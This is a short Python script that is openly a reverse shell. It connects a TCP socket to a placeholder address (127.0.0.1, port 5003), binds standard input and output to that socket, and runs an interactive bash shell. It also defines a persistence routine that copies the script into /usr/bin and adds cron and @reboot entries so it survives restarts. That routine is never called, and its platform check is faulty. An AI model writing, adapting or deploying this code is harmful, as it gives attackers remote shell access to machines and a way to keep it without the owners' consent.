#!/usr/bin/env
from subprocess import run
import os 
while True:

    def persistence_job():
        import platform
        import time
        os.system('clear')

        if platform == "linux":
            FILE_CHECK = os.path.exists("reverseshell_self.py")
            if FILE_CHECK == True:   
                os.system('sudo mv reverseshell.py /usr/bin')
                run(f'sudo chattr -i /usr/bin/reverseshell.py', shell=True)
                run(f'echo "30 18 * * * /usr/bin/reverseshell.py" | crontab -e', shell=True)
                run(f'echo "@reboot /usr/bin/reverseshell.py" | tee -a /etc/crontab', shell=True)
                time.sleep(1.5)

            elif FILE_CHECK == False:  
                pass

            else:
                return persistence_job()

    class shell:
        
        def __init__(self, TARGET_IPADDRESS, TARGET_PORT):
            self.TARGET_IPADDRESS = TARGET_IPADDRESS
            self.TARGET_PORT = TARGET_PORT
            
    REVERSE_CONNECTION = shell("127.0.0.1", int(5003))

    from os import dup2
    import socket
    os.system('clear')

    # Change socket.SOCK_STREM(TCP) to socket.SOCK_DRAM for UDP connection
    SOCKET_SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    SOCKET_SOCK.connect((REVERSE_CONNECTION.TARGET_IPADDRESS, REVERSE_CONNECTION.TARGET_PORT))

    dup2(SOCKET_SOCK.fileno(),0)
    dup2(SOCKET_SOCK.fileno(),1)
    dup2(SOCKET_SOCK.fileno(),2)
    run(["/bin/bash","-i"])   

    
